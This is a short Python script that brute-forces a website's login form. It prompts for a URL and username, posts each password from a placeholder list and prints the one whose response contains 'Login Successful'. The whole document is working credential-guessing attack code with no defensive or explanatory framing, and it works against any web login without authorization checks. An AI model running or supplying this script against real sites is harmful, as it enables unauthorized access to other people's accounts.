import requests

url = input("Enter Website URL: ")

# Set the username and password to be brute-forced
username = input("Enter username: ")
password_list = ["password1", "password2", "password3"]  # Replace with your own password list

for password in password_list:
    # Prepare the data for the login request
    data = {
        "username": username,
        "password": password
    }
    
    # Send the login request
    response = requests.post(url, data=data)
    
    # Check if the login was successful
    if "Login Successful" in response.text:
        print("Password found: " + password)
        break
